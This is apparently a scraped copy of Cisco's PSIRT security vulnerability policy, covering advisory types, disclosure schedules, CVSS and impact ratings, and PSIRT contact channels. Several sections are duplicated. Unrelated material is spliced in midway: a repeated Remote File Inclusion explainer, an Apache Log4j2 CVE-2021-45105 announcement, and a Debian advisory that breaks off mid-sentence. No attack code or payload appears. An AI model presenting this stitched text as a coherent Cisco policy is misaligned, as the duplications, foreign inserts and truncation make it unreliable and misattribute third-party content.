[Cisco Security Advisories](https://sec.cloudapps.cisco.com/security/center/publicationListing.x) provide detailed information about security issues that directly involve Cisco products and cloud-hosted services and require an upgrade, fix, or other customer action. Security Advisories are used to disclose vulnerabilities in Cisco-authored software or in high-profile third-party software with a Critical, High, or Medium SIR. The Cisco PSIRT only validates the affected and fixed version information documented in the advisory.

All Cisco Security Advisories that disclose vulnerabilities with a Critical, High, or Medium SIR include an option to download [Common Security Advisory Framework (CSAF)](https://csaf.io/) content. CSAF is an industry standard designed to depict vulnerability information in machine-readable format. This machine-readable content can be used with other tools to automate the process of interpreting data contained in a Security Advisory. CSAF content can be downloaded directly from each Security Advisory. For more information about CSAF, see the preceding link.

The Informational type of Cisco Security Advisories addresses issues that require a response to information discussed in a public forum, such as a blog or discussion list. Informational advisories are normally published if a third party makes a public statement about a Cisco product vulnerability. Informational advisories may also be used to proactively notify customers about a security-related issue that is not a vulnerability.

### Cisco Event Responses

Cisco [Event Responses](https://sec.cloudapps.cisco.com/security/center/erp.x?i=52) provide information about security events that have the potential for widespread impact on customer networks, applications, and devices. Cisco Event Responses contain summary information, threat analysis, and mitigation techniques that feature Cisco products and cloud-hosted services. They are normally published under the following circumstances:

* If a significant security vulnerability exists in a vendor's product that could affect a Cisco product due to interoperation with the vendor's product or use of the network as a vector for exploitation
* In response to the release of Cisco IOS and IOS XE, Cisco IOS XR, Cisco NX-OS, and Cisco ASA, FTD, and FMC Software bundled publications

### Release Note Enclosures

Release Note Enclosures are used to disclose issues with a Low SIR and most third-party software vulnerabilities. All Cisco bug IDs that are disclosed by Cisco are available for registered customers to view in the [Cisco Bug Search Tool](https://tools.cisco.com/bugsearch/).

If a Cisco Security Advisory references a bug, the bug entry in the Cisco Bug Search Tool will link to the relevant Cisco Security Advisory.

Any Cisco bug that has been evaluated by the Cisco PSIRT includes a "PSIRT Evaluation" section in its Release Note Enclosure. This section includes, where Cisco deems appropriate and relevant, Base and Temporal CVSS scores and a CVE ID. Customers are invited to use this additional information at their discretion and correlate Cisco bugs with industry events. This information is not intended to supplement any standard Cisco warranties applicable to the software as stated in the [Cisco End User License Agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html).

Free software updates will not be provided for issues that are disclosed through a Release Note Enclosure. Customers who wish to upgrade to a software version that includes fixes for those issues should contact their normal support channels. Any exception to this policy will be determined solely at the discretion of Cisco.

The following table summarizes the methods used to notify customers about the aforementioned security publications. Exceptions may be made on a case-by-case basis to increase communication for a given document.

| **Publication** | **Email** | **Security Portal** | **RSS** | **CNS** | **openVuln API** | **Bug Search Tool** |
| --- | --- | --- | --- | --- | --- | --- |
| **Cisco Security Advisory—Critical and High Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Medium Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Informational** | Yes | Yes | Yes | No | No | Yes |
| **Cisco Event Response** | No | Yes | Yes | No | No | No |
| **Release Note Enclosure** | No | No | No | No | No | Yes |

### **Communications Plan**

If one or more of the following conditions exist, Cisco will publicly disclose Cisco Security Advisories:

* The Cisco PSIRT has completed the incident response process and determined that enough software patches or workarounds exist to address the vulnerability, or subsequent public disclosure of code fixes is planned to address high-severity vulnerabilities.
* The Cisco PSIRT has observed active exploitation of a vulnerability that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* There is the potential for increased public awareness of a vulnerability affecting Cisco products and/or cloud-hosted services that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* The Cisco PSIRT has declared a third-party software vulnerability to be "high profile."

All Cisco security publications are disclosed to customers and the public simultaneously.

When coordinating disclosure with third parties, the Cisco PSIRT will attempt to provide notification of any changes to the Cisco PSIRT public disclosure schedule.

As documented in the [Receiving Security Vulnerability Information from Cisco](#rsvifc) section of this document, Cisco delivers technical security information about software fixes in Cisco products and distributes product updates through several channels. Cisco reserves the right to deviate from this policy on an exception basis to ensure access to Cisco.com for software patch availability.

### **Disclosure Schedule**

In direct response to customer feedback, Cisco releases the following bundles of Cisco Security Advisories at 1600 Greenwich Mean Time (GMT) on a regular schedule twice each year. This schedule applies to the disclosure of vulnerabilities in the following Cisco products and does not apply to the disclosure of vulnerabilities in other Cisco products.

| **Cisco Product(s)** | **Release Schedule** |
| --- | --- |
| Cisco NX-OS Software | Fourth Wednesday of February and August |
| Cisco IOS XR Software | Second Wednesday in March and September |
| Cisco IOS and IOS XE Software | Fourth Wednesday in March and September |

### All Other Products

Cisco generally discloses Cisco Security Advisories at 1600 GMT on any given Wednesday.

### Exceptions

Cisco reserves the right to publish an individual Security Advisory for Cisco IOS and IOS XE Software, Cisco IOS XR Software, or Cisco NX-OS Software or other products outside the published schedule. Conditions under which an out-of-cycle publication may occur include, but are not limited to, the following:

* Cisco detects heightened public awareness of a serious vulnerability.
* Cisco learns of active exploitation of a vulnerability.
* Cisco works with a third-party coordination center to publicly disclose a vulnerability.

### **Incident Response Eligibility**

All customers, regardless of contract status, are eligible to receive support from the Cisco TAC for a known or reasonably suspected security vulnerability in Cisco products and services. For more information about how to contact the Cisco TAC, see the [General Security-Related Queries](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html#gsrq) section of this document. Customers who contact the Cisco TAC should reference the URL of the Cisco security publication to assist in connecting with the proper support team.

Customers with paid service contracts for incident response and forensic assistance should request assistance through the contact methods specified in their contract.

Cisco, at its sole discretion, may offer customers additional security services free of charge. Cisco reserves the right to determine the type and degree of free assistance it may offer in connection with any incident and to withdraw from such an incident at any time.

### **Security Software Updates**

The Cisco PSIRT will investigate and disclose vulnerabilities in Cisco products and services from the date of First Commercial Shipment (FCS) to the [LDoS](https://www.cisco.com/c/en/us/products/eos-eol-policy.html). Cisco customers with service contracts that entitle them to regular software updates should obtain security fixes through their usual update channels, generally from the Cisco website for the relevant product. Cisco recommends contacting the Cisco TAC only with specific and imminent problems or questions.

As a special customer service, and to improve the overall security of the internet, Cisco may offer customers free software updates to address high-severity security problems. The decision to provide free software updates is made on a case-by-case basis. Refer to the Cisco security publication for details. Free software updates will typically be limited to Critical- and High-severity vulnerabilities.

Fixes for some third-party software vulnerabilities may be available only in the most recent major software releases and not backported to older releases.

If Cisco has offered a free software update to address a specific issue, noncontract customers who are eligible for the update may obtain it by contacting the Cisco TAC using any of the methods described in the [General Security-Related Queries](#gsrq) section of this document.

**Note:** To verify their entitlement, individuals who contact the Cisco TAC should have available the URL of the Cisco document that is offering the update.

Customers may only download, install, and expect support for software releases and feature sets for which they have purchased a valid license that is current and active. By installing, downloading, accessing, or otherwise using such software updates, customers agree to follow the terms of the [Cisco software license agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html). In most cases, the software update will be a maintenance release to software that was previously purchased. Free security software updates do not entitle customers to a new software license, additional software feature sets, or major revision upgrades.

After [End of Sale](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (EoS), the availability of security fixes for vulnerabilities is defined in the product’s EoS bulletin. (See the [End-of-Life Policy](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) for details.) The EoS bulletin may define the Last Day of Support (**LDoS**) milestone, which identifies the last date that Cisco will investigate and disclose product vulnerabilities.

Once the LDoS has been reached, the Cisco PSIRT will continue to accept vulnerability reports but will not analyze, fix, or disclose potential vulnerabilities. To this end, the Cisco PSIRT will not issue CVEs for issues reported on products that are past the LDoS milestone.

### Security Advisory Terms and Conventions

**Fixed Release Availability:** If a future release date is indicated for software, the date provided represents an estimate based on all information known to Cisco as of the "Last Updated" date at the top of the advisory. Availability dates are subject to change based on a number of factors, including satisfactory testing results and delivery of other priority features and fixes. If no version or date is listed for an affected component (indicated by a blank field and/or an advisory designation of Interim), Cisco is continuing to evaluate the fix and will update the advisory as additional information becomes available. After the advisory is marked Final, customers should refer to the associated Cisco bug(s) for further details.

The designated Security Advisory status indicates the following:

**Interim:** The Cisco investigation is ongoing. Cisco will issue revisions to the advisory when additional information, including fixed software release data, becomes available.

**Final:** Cisco has completed its evaluation of the vulnerability described in the advisory. There will be no further updates unless there is a material change in the nature of the vulnerability.

All aspects of this process are subject to change without notice and on a case-by-case basis. No particular level of response is guaranteed for any specific issue or class of issues.

### Rule Vulnerability

Remote File Inclusion

Remote File Inclusion (RFI) attacks occur when a webserver takes a file crafted by an attacker as input and runs or stores it in an unsafe manner. For instance, the webserver could accept an image file that is actually code, then call it to execute after uploading. RFI attacks happen on web applications that dynamically include external files or scripts. A successful RFI can lead to data leaks, remote code execution, or cross site scripting. Avoid dynamic inclusion of user input files, or whitelist files that may be included. Keep the PHP allow\_url\_include option set to off; this will not protect against Local File Inclusion attacks.

Subject: CVE-2021-45105: Apache Log4j2 does not always protect from infinite
 recursion in lookup evaluation

Severity: high

Description:

Apache Log4j2 versions 2.0-alpha1 through 2.16.0 (excluding 2.12.3)
did not protect from uncontrolled recursion from self-referential
lookups. This allows an attacker with control over Thread Context Map
data to cause a denial of service when a crafted string is
interpreted. This issue was fixed in Log4j 2.17.0 and 2.12.3.

This issue is being tracked as LOG4J2-3230

Mitigation:

Implement one of the following mitigation techniques:

* Java 8 (or later) users should upgrade to release 2.17.0.

Alternatively, this can be mitigated in configuration:

* In PatternLayout in the logging configuration, replace Context
Lookups like `${ctx:loginId}` or `$${ctx:loginId}` with Thread Context
Map patterns (%X, %mdc, or %MDC).
* Otherwise, in the configuration, remove references to Context
Lookups like `${ctx:loginId}` or `$${ctx:loginId}` where they
originate
from sources external to the application such as HTTP headers or user input.

[CVE-2021-44832](#CVE-2021-44832)
### Rule Vulnerability

Remote File Inclusion

Remote File Inclusion (RFI) attacks occur when a webserver takes a file crafted by an attacker as input and runs or stores it in an unsafe manner. For instance, the webserver could accept an image file that is actually code, then call it to execute after uploading. RFI attacks happen on web applications that dynamically include external files or scripts. A successful RFI can lead to data leaks, remote code execution, or cross site scripting. Avoid dynamic inclusion of user input files, or whitelist files that may be included. Keep the PHP allow\_url\_include option set to off; this will not protect against Local File Inclusion attacks.

Package        : apache-log4j2
CVE ID         : CVE-2021-45105
Debian Bug     : 1001891

It was found that Apache Log4j2, a Logging Framework for Java, did not protect
from uncontrolled recursion from self-referential lookups. When the logging
configuration uses a non-default Pattern Layout with a Context Lookup (for
example, $${ctx:loginId}), attackers with control over Thread Context Map (MDC)
input data can craft malicious input data that contains a recursive lookup,
resulting in a denial of service.

For the oldstable distribution (buster), this problem has been fixed
in version 2.17.0-1~deb10u1.

For the stable distribution (bullseye), this problem has been fixed in
version 2.17.0-1~deb11u1.

We recommend that you upgrade your apache-log4j2 packages.

For the detailed security status of apache-log4j2 please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/apache-log4j2>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be

## Purpose

This policy was created to guide and inform Cisco customers in the event of a reported vulnerability in a Cisco product or cloud-hosted service. It ensures that Cisco customers have a consistent, unambiguous resource to help them understand how Cisco responds to events of this nature.

## Policy

This policy clearly states how Cisco addresses reported security vulnerabilities in Cisco products and cloud-hosted services, including the timeline, actions, and responsibilities that apply to all customers.

## Cisco Product Security Incident Response

The Cisco Product Security Incident Response Team (PSIRT) is responsible for responding to Cisco product security incidents. The Cisco PSIRT is a dedicated, global team that manages the receipt, investigation, and public reporting of information about security vulnerabilities and issues related to Cisco products and services. Cisco defines a security vulnerability as a weakness in the computational logic (e.g., code) found in software and hardware components that, when exploited, results in a negative impact to confidentiality, integrity, or availability. Cisco reserves the right to deviate from this definition based on specific circumstances. The Cisco PSIRT adheres to ISO/IEC 29147:2018, which are [guidelines for disclosure of potential vulnerabilities](https://www.iso.org/standard/72311.html) established by the International Organization for Standardization.

The on-call Cisco PSIRT works 24 hours a day with Cisco customers, independent security researchers, consultants, industry organizations, and other vendors to identify possible security vulnerabilities and issues with Cisco products and networks.

## Reporting or Obtaining Support for a Suspected Security Vulnerability

Individuals or organizations that are experiencing a product security issue are strongly encouraged to contact the Cisco PSIRT. Cisco welcomes reports from independent researchers, industry organizations, vendors, customers, and other sources concerned with product or network security. At minimum, a description of the potential vulnerability is needed to report a security issue.

To contact the Cisco PSIRT, use one of the following methods:

*Primary approach:* The most effective method for reaching the Cisco PSIRT is sending an email to psirt@cisco.com. In the email, provide a detailed problem description and any relevant details and logs.

Alternatively, the Cisco PSIRT may be contacted using the following phone numbers:

* +1 877 228 7302 (toll-free within North America)
* +1 408 525 6532 (international direct dial)

These contact numbers route to Cisco global customer support. To facilitate engagement, please explain that this is a product security issue or, alternatively, reference the PSIRT-SVP-001 search code.

Cisco encourages customers to encrypt sensitive information that is sent to Cisco by email. The Cisco PSIRT supports encrypted messages via Pretty Good Privacy (PGP)/GNU Privacy Guard (GPG) encryption software. The Cisco PSIRT public key is available at the following link: <https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc>.

**Note:** Cisco supports an RFC 9116-compliant security.txt file, located at <https://www.cisco.com/.well-known/security.txt>.

## General Security-Related Queries

For general security concerns about Cisco products and cloud-hosted services, the Cisco Technical Assistance Center (TAC) can provide configuration and technical assistance. The Cisco TAC can also help with nonsensitive security incidents and software upgrades for security bug fixes. To contact the Cisco TAC, use one of the following methods:

|  | **Cisco TAC Support** |
| --- | --- |
| **Phone** | +1 800 553 2447 (toll-free within North America)+1 408 526 7209 (international direct dial) Additional TAC numbers: [Customer Service Contacts](https://www.cisco.com/c/en/us/support/web/tsd-cisco-worldwide-contacts.html) |
| **Web** | <https://mycase.cloudapps.cisco.com/start> |

### **Cisco.com**

The [Cisco Security portal](https://www.cisco.com/security) on Cisco.com provides Cisco security vulnerability documents and Cisco security information, including relevant security products and services.

For direct links to specific security functions, see the [Types of Security Publications](#tosp) section of this
document.

### **Email**

Cisco Security Advisories provide information about Critical-, High-, and Medium-severity security vulnerabilities. They are clear signed with the Cisco PSIRT [PGP public key](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/files/Cisco_PSIRT_PGP_Public_Key.asc) and distributed to the external cust-security-announce@cisco.com mailing list. The Cisco PSIRT may also send Informational advisories to the cust-security-announce mailing list. Informational advisories are used not as a disclosure mechanism for any Cisco vulnerabilities but for sharing information on security incidents that may impact Cisco products and that may be of interest to Cisco customers.

Emails are sent for the initial release of and major revisions to Cisco Security Advisories. A major revision is defined as a significant change to advisory content that could result in the customer addressing the vulnerability differently. Examples of a major advisory change include, but are not limited to, changes to the affected products list, changes in Security Impact Rating (SIR; see the [Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating](#asr) section of this document), and changes in mitigation and/or fix information. If a document undergoes a minor revision, the update will be posted to Cisco.com without an accompanying email. Customers that require automated alerts for minor revisions should subscribe to the Cisco Security Advisory Really Simple Syndication (RSS) feed or My Notifications. All Security Advisories on Cisco.com are displayed in chronological order, with the most recent advisories and updates appearing at the top of the page.

To subscribe to the cust-security-announce mailing list, email cust-security-announce-join@cisco.com. (The content of the message does not matter.) You will receive confirmation, instructions, and a list policy statement.

Please note that requests must be sent to cust-security-announce-join@cisco.com and not to the cust-security-announce@cisco.com list itself.

To unsubscribe from the cust-security-announce mailing list, email cust-security-announce-leave@cisco.com with the word "unsubscribe" in the subject line. (The content of the message does not matter.) You will receive a confirmation notice, to which you need to reply to be unsubscribed. You will not be unsubscribed unless you reply to the confirmation email.

Please note that requests to subscribe must be sent to cust-security-announce-join@cisco.com, and requests to unsubscribe must be sent to cust-security-announce-leave@cisco.com—not to the cust-security-announce@cisco.com email address itself.

You must send the messages from the account that you want to be subscribed to or unsubscribed from the list.

Customers can also request to be subscribed or unsubscribed to the cust-security-announce mailing list by emailing psirt@cisco.com.

## Commitment to Product Security and Integrity at Cisco

Cisco product development practices specifically prohibit any intentional behaviors or product features that are designed to allow unauthorized device or network access, exposure of sensitive device information, or a bypass of security features or restrictions. These include, but are not limited to:

* Undisclosed device access methods or "back doors"
* Hardcoded or undocumented account credentials
* Covert communication channels
* Undocumented traffic diversion

Cisco considers such product behaviors to be serious vulnerabilities. Cisco will address any issues of this nature with the highest priority and encourages all parties to report suspected vulnerabilities to the Cisco PSIRT for immediate investigation. Internal and external reports of these vulnerabilities will be managed and disclosed in accordance with the terms of the Cisco Security Vulnerability Policy.

More information can be found on the [Cisco Secure Development Lifecycle (CSDL) website](https://www.cisco.com/c/en/us/about/trust-center/technology-built-in-security.html#~stickynav=2).

## Cisco Product Security Incident Response Process

Figure 1 illustrates the vulnerability life cycle and the Cisco PSIRT disclosure and resolution process at a high level.

**Figure 1.** Cisco Product Security Incident Response Process

![response process cycle from awareness to feedback](https://cscrdr.cloudapps.cisco.com/cscrdr/security/center/public/files/images/white_papers/psirtprocess.jpg "Cisco Product Security Incident Response Process")

The steps in the process illustrated in Figure 1 are as follows:

1. **Awareness:** PSIRT receives notification of a security incident.
2. **Active Management:** PSIRT prioritizes and identifies resources.
3. **Software Fixes:** PSIRT coordinates the fix and impact assessment.
4. **Customer Notification:** PSIRT notifies all customers simultaneously.

The Cisco PSIRT investigates all reports regardless of the Cisco software code version or product life cycle status until the product reaches the [Last Day of Support](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (LDoS). Issues will be prioritized based on the potential severity of the vulnerability and other environmental factors. Ultimately, the resolution of a reported incident may require upgrades to products and cloud-hosted services that are under active support from Cisco. As a best practice, Cisco strongly recommends that customers periodically verify that their products are under active support for access to the latest software updates and other benefits.

Throughout the investigative process, the Cisco PSIRT strives to work collaboratively with the source of the report (incident reporter) to confirm the nature of the vulnerability, gather required technical information, and ascertain appropriate remedial action. When the initial investigation is complete, results will be delivered to the incident reporter along with a plan for resolution and public disclosure. If the incident reporter disagrees with the conclusion, the Cisco PSIRT will make every effort to address those concerns.

In the case of incidents about which an agreement cannot be reached through the normal process, incident reporters may escalate by contacting the [Cisco TAC](#gsrq) and requesting the director of the global Cisco PSIRT team.

During any investigation, the Cisco PSIRT manages all sensitive information on a highly confidential basis. Internal distribution is limited to those individuals who have a legitimate need to know and can actively assist in the resolution. Similarly, the Cisco PSIRT asks incident reporters to maintain strict confidentiality until complete resolutions are available for customers and have been published by the Cisco PSIRT on the Cisco website through the appropriate coordinated disclosure.

With the agreement of the incident reporter, the Cisco PSIRT may acknowledge the reporter's contribution during the public disclosure of the vulnerability.

The Cisco PSIRT works with third-party coordination centers such as the [Computer Emergency Response Team Coordination Center](https://www.kb.cert.org/vuls/) (CERT/CC), [Computer Emergency Response Team of Finland](https://www.kyberturvallisuuskeskus.fi/en/) (CERT-FI), [Japan Computer Emergency Response Team](https://www.jpcert.or.jp/english/) (JP-CERT), and [National Protective Security Authority](https://www.npsa.gov.uk) (NPSA) to manage a coordinated industry disclosure for vulnerabilities reported to Cisco that may impact multiple vendors (for example, a generic protocol issue). In these situations, the Cisco PSIRT will either assist the incident reporter with contacting the coordination center or do so on the incident reporters behalf.

If a reported vulnerability involves a vendor product, the Cisco PSIRT will notify the vendor directly, coordinate with the incident reporter, or engage a third-party coordination center.

The Cisco PSIRT will coordinate with the incident reporter to determine the frequency of status updates on the incident and documentation updates.

In the event that Cisco becomes aware of a vulnerability that does not affect a Cisco product but does involve another vendor's product, Cisco will follow the Cisco [policy for reporting vulnerabilities to vendors](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html).

## Disclosure of Security Vulnerabilities Discovered as Part of Cisco Services Delivery

If a new or previously undisclosed security vulnerability is found during a Cisco Services engagement with a customer, Cisco will follow the [Cisco Product Security Incident Response Process](#cpsirp). Vulnerabilities found in Cisco products and cloud-hosted services will be handled by the Cisco PSIRT according to the [Cisco Security Vulnerability Policy](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html). If the vulnerability is in another vendors product, Cisco will follow the [Cisco Vendor Vulnerability Reporting and Disclosure Policy](https://sec.cloudapps.cisco.com/security/center/resources/vendor_vulnerability_policy.html) unless the affected customer wishes to report the vulnerability to the vendor directly; in that case, Cisco will facilitate contact between the customer and the vendor, and will notify CERT/CC (or its national equivalent).

Cisco will protect customer-specific data at all times throughout this process. Specifically, Cisco will not share any customer-specific data unless directed to do so by the affected customer, or as required by a legal investigation.

### **Assessing Security Risk—Common Vulnerability Scoring System and the Security Impact Rating**

Cisco uses [Version 3.1](https://www.first.org/cvss/v3-1/) of the [Common Vulnerability Scoring System](https://www.first.org/cvss/) (CVSS) as part of its standard process of evaluating reported potential vulnerabilities that do not have a CVE in Cisco products and cloud-hosted services. The CVSS model uses three distinct measurements, or scores, that include Base, Temporal, and Environmental calculations. Cisco will provide an evaluation of the Base vulnerability score and, in some instances, the Temporal vulnerability score. End users are encouraged to compute the Environmental score based on their network parameters. The combination of all three scores should be considered the final score, which represents a moment in time and is tailored to a specific environment. Organizations are advised to use this final score to prioritize responses in their own environments.

**Note:** Cisco began transitioning to CVSS Version 3.1 (CVSSv3.1) in May 2020.

In addition to CVSS scores, Cisco uses the Security Impact Rating (SIR) as a way to categorize vulnerability severity in a simpler manner. The SIR is based on the CVSS Qualitative Severity Rating Scale of the Base score, may be adjusted by PSIRT to account for Cisco-specific variables, and is included in every Cisco Security Advisory. Cisco uses the following guidelines to determine the Cisco Security Advisory type for vulnerabilities in Cisco-authored, customer-managed software. Security Advisories for Critical, High, and Medium SIRs include fixed software information.

| **Publication** | **Type** | **CVSS** | **CVE** | **Fix Information** | **Machine-Readable Format** |
| --- | --- | --- | --- | --- | --- |
| Cisco Security Advisory | Critical | 9.0–10.0 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, Adaptive Security Appliance (ASA), Firepower Threat Defense (FTD), and Firepower Management Center (FMC) Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| High | 7.0–8.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Medium | 4.0–6.9 | Yes | Fix information in the Security Advisory and bug. Detailed fix information for Cisco IOS, IOS XE, NX-OS, ASA, FTD, and FMC Software can be obtained using the Cisco Software Checker. | [RSS, CSAF](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |
| Informational | N/A | No | Fix information in bug (if applicable). | [RSS](https://sec.cloudapps.cisco.com/security/center/rss.x?i=44) |

Issues with a Low SIR are typically published as a bug Release Note Enclosure (RNE) and not as a Security Advisory.

Cisco reserves the right to deviate from these guidelines in specific cases if additional factors are not properly captured in the CVSS score.

If there is a security issue with a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the third party. In some cases, Cisco may adjust the CVSS score to reflect the impact to the Cisco product.

**Note:** Cisco is a [Common Vulnerabilities and Exposures](https://cve.mitre.org/index.html) (CVE) Numbering Authority and will assign CVE IDs to Cisco software vulnerabilities from the MITRE block of IDs assigned to the company for this purpose. Cisco does not assign CVE IDs for reported vulnerabilities until the vulnerabilities have been confirmed by Cisco. After vulnerabilities are published, Cisco provides CVE details to MITRE for inclusion in its database.

For more information about CVSS, visit [FIRST.org](https://www.first.org/cvss/).
### **Cisco Cloud-Hosted Services**

Cisco offers multiple cloud-hosted services that are used by customers but are maintained, patched, and monitored by Cisco.

The Cisco PSIRT responds to vulnerabilities in Cisco cloud-hosted services and works closely with the teams that operate them. These teams ensure that security vulnerabilities are fixed and patches are deployed to all customer instances in a timely manner.

Typically, service-related security events are communicated to customers by the service teams through direct notification or through the service dashboard or portal. In some instances, Cisco may disclose vulnerabilities through Security Advisories for Cisco cloud-hosted services in coordination with the service teams.

In most cases, no user action is required because Cisco regularly patches cloud-hosted services.

### **Third-Party Software Vulnerabilities**

If there is a vulnerability in a third-party software component that is used in a Cisco product, Cisco typically uses the CVSS score provided by the component creator. Cisco may adjust the CVSS score to reflect the impact to Cisco products.

Cisco will consider a third-party vulnerability “high profile” if it meets the following criteria:

* The vulnerability exists in a third-party component.
* Multiple Cisco products and/or cloud-hosted services are affected.
* The CVSS score is 5.0 or above.
* The vulnerability has gathered significant public attention.
* The vulnerability is likely to have exploits available and is expected to be, or is being, actively exploited.

For high profile, third-party vulnerabilities, Cisco will begin assessing all potentially impacted products and cloud-hosted services that have not reached the LDoS and publish a Security Advisory within 24 hours after Cisco classifies the vulnerability as high profile. All known affected Cisco products and cloud-hosted services will be detailed in an update to the initial Security Advisory that will be published within 7 days of the initial disclosure. A Cisco bug will be created for each vulnerable product so that registered customers can view them using the Cisco Bug Search Toolkit. Third-party vulnerabilities that are not classified as high profile will be disclosed in a Release Note Enclosure.

### **Cisco Vulnerability Repository**

The [Cisco Vulnerability Repository](https://sec.cloudapps.cisco.com/security/center/cvr) (CVR) is a vulnerability search engine for CVEs reported after 2017 that may impact Cisco products. CVR can help customers understand if their Cisco product is affected by a particular third-party software vulnerability. This tool also displays any Cisco Security Advisories associated with a CVE. At this time, CVR does not include Cisco cloud offers. For help with a product not listed in this tool, please use the Feedback link on the [CVR page](https://sec.cloudapps.cisco.com/security/center/cvr) or contact your support organization.

### **Vulnerability Exploitability eXchange**

Customers may request a Vulnerability Exploitability eXchange (VEX) document for any CVE in CVR.

### **Types of Security Publications**

In all security publications, Cisco discloses the information required for an end user to assess the impact of a vulnerability and any potential steps needed to protect their environment. Cisco does not provide vulnerability details that could enable someone to craft an exploit. Cisco Security Advisories are point-in-time documents. Information should only be considered up to date as of the time and date of the last publication update as indicated by the "Last Updated" field in the advisory header.

Cisco provides the following types of security-related publications via the [Cisco Security portal](https://www.cisco.com/security) on Cisco.com.

### Cisco Security Advisories

[Cisco Security Advisories](https://sec.cloudapps.cisco.com/security/center/publicationListing.x) provide detailed information about security issues that directly involve Cisco products and cloud-hosted services and require an upgrade, fix, or other customer action. Security Advisories are used to disclose vulnerabilities in Cisco-authored software or in high-profile third-party software with a Critical, High, or Medium SIR. The Cisco PSIRT only validates the affected and fixed version information documented in the advisory.

All Cisco Security Advisories that disclose vulnerabilities with a Critical, High, or Medium SIR include an option to download [Common Security Advisory Framework (CSAF)](https://csaf.io/) content. CSAF is an industry standard designed to depict vulnerability information in machine-readable format. This machine-readable content can be used with other tools to automate the process of interpreting data contained in a Security Advisory. CSAF content can be downloaded directly from each Security Advisory. For more information about CSAF, see the preceding link.

The Informational type of Cisco Security Advisories addresses issues that require a response to information discussed in a public forum, such as a blog or discussion list. Informational advisories are normally published if a third party makes a public statement about a Cisco product vulnerability. Informational advisories may also be used to proactively notify customers about a security-related issue that is not a vulnerability.

### Cisco Event Responses

Cisco [Event Responses](https://sec.cloudapps.cisco.com/security/center/erp.x?i=52) provide information about security events that have the potential for widespread impact on customer networks, applications, and devices. Cisco Event Responses contain summary information, threat analysis, and mitigation techniques that feature Cisco products and cloud-hosted services. They are normally published under the following circumstances:

* If a significant security vulnerability exists in a vendor's product that could affect a Cisco product due to interoperation with the vendor's product or use of the network as a vector for exploitation
* In response to the release of Cisco IOS and IOS XE, Cisco IOS XR, Cisco NX-OS, and Cisco ASA, FTD, and FMC Software bundled publications

### Release Note Enclosures

Release Note Enclosures are used to disclose issues with a Low SIR and most third-party software vulnerabilities. All Cisco bug IDs that are disclosed by Cisco are available for registered customers to view in the [Cisco Bug Search Tool](https://tools.cisco.com/bugsearch/).

If a Cisco Security Advisory references a bug, the bug entry in the Cisco Bug Search Tool will link to the relevant Cisco Security Advisory.

Any Cisco bug that has been evaluated by the Cisco PSIRT includes a "PSIRT Evaluation" section in its Release Note Enclosure. This section includes, where Cisco deems appropriate and relevant, Base and Temporal CVSS scores and a CVE ID. Customers are invited to use this additional information at their discretion and correlate Cisco bugs with industry events. This information is not intended to supplement any standard Cisco warranties applicable to the software as stated in the [Cisco End User License Agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html).

Free software updates will not be provided for issues that are disclosed through a Release Note Enclosure. Customers who wish to upgrade to a software version that includes fixes for those issues should contact their normal support channels. Any exception to this policy will be determined solely at the discretion of Cisco.

The following table summarizes the methods used to notify customers about the aforementioned security publications. Exceptions may be made on a case-by-case basis to increase communication for a given document.

| **Publication** | **Email** | **Security Portal** | **RSS** | **CNS** | **openVuln API** | **Bug Search Tool** |
| --- | --- | --- | --- | --- | --- | --- |
| **Cisco Security Advisory—Critical and High Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Medium Severity** | Yes | Yes | Yes | Yes | Yes | Yes |
| **Cisco Security Advisory—Informational** | Yes | Yes | Yes | No | No | Yes |
| **Cisco Event Response** | No | Yes | Yes | No | No | No |
| **Release Note Enclosure** | No | No | No | No | No | Yes |

### **Communications Plan**

If one or more of the following conditions exist, Cisco will publicly disclose Cisco Security Advisories:

* The Cisco PSIRT has completed the incident response process and determined that enough software patches or workarounds exist to address the vulnerability, or subsequent public disclosure of code fixes is planned to address high-severity vulnerabilities.
* The Cisco PSIRT has observed active exploitation of a vulnerability that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* There is the potential for increased public awareness of a vulnerability affecting Cisco products and/or cloud-hosted services that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* The Cisco PSIRT has declared a third-party software vulnerability to be "high profile."

All Cisco security publications are disclosed to customers and the public simultaneously.

When coordinating disclosure with third parties, the Cisco PSIRT will attempt to provide notification of any changes to the Cisco PSIRT public disclosure schedule.

